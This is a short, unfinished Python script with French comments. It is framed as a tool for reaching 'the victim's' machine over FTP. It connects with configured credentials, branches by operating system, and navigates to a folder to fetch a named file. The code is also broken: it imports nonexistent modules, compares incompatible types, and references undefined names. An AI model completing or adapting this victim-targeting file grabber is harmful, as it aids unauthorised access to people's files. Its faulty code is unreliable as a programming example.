import library.ftp as ftp
import library.os as os
import library.zipapp as zip
import library.zipfile as zipa
import library.cryptography as cr
import library.mpath as mp
#Informations à paramétrer selon vos besoins
operatingSystem = ""#1 = Windows 2 = MacOs 3 = Linux
host = ""
port = 22 #Port N°21 pour du ftp normal; Port N°22 pour du sftp.
timeout = 999
user = "sftp"
password = "sftp"
toGetDir = "nomDeVotreDossier"
toGetFile = "nomDeVotreFichier"
indiceDeLocalisation = "default"   #Vous pouvez mettre user pour le dossier user; desktop pour le bureau; path si vous connaissez le chemin d'accès(Dans ce cas là merci de le spécifier juste en dessous)
filePath = "default"    #Chemin d'acces complet:
#Code source
if operatingSystem == 1:
	print("La victime est sur Windows")
	try:
		print("Tentative de connexion à {} sur le port {}.".format(host, port))
		ftp = ftp.FTP(host, port)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le nom de domaine/port est faux.")
		exit(0)

	try:
		print("Tentative de LogIn en tant que {} sur {}:{}".format(user, host, port))
		ftp.login(user=user, passwd=password)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le compte / mot de passe est faux.")
		exit(0)
	#Recherche du fichier
	if indiceDeLocalisation != default:
		if filePath != default:
			try:
				ftp.cwd(filePath)
			except:
				print("Vous n'avez pas rentré un chemin d'accès valide pour ce système d'exploitation. Veuillez vérifier votre configuration.")
				exit(0)





elif operatingSystem == 2:
	print("La victime est sur MacOs")
	try:
		print("Tentative de connexion à {} sur le port {}.".format(host, port))
		ftp = ftp.FTP(host, port)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le nom de domaine/port est faux.")
		exit(0)

	try:
		print("Tentative de LogIn en tant que {} sur {}:{}".format(user, host, port))
		ftp.login(user=user, passwd=password)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le compte / mot de passe est faux.")
		exit(0)




elif operatingSystem == 3:
	print("La victime est sur Linux")
	try:
		print("Tentative de connexion à {} sur le port {}.".format(host, port))
		ftp = ftp.FTP(host, port)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le nom de domaine/port est faux.")
		exit(0)

	try:
		print("Tentative de LogIn en tant que {} sur {}:{}".format(user, host, port))
		ftp.login(user=user, passwd=password)
	except:
		print("Une erreur s'est produite; Êtes-vous bien connecté à Internet? Si oui, le compte / mot de passe est faux.")
		exit(0)




else:
	print("Merci de choisir un système d'exploitation valide.")
	exit(0)
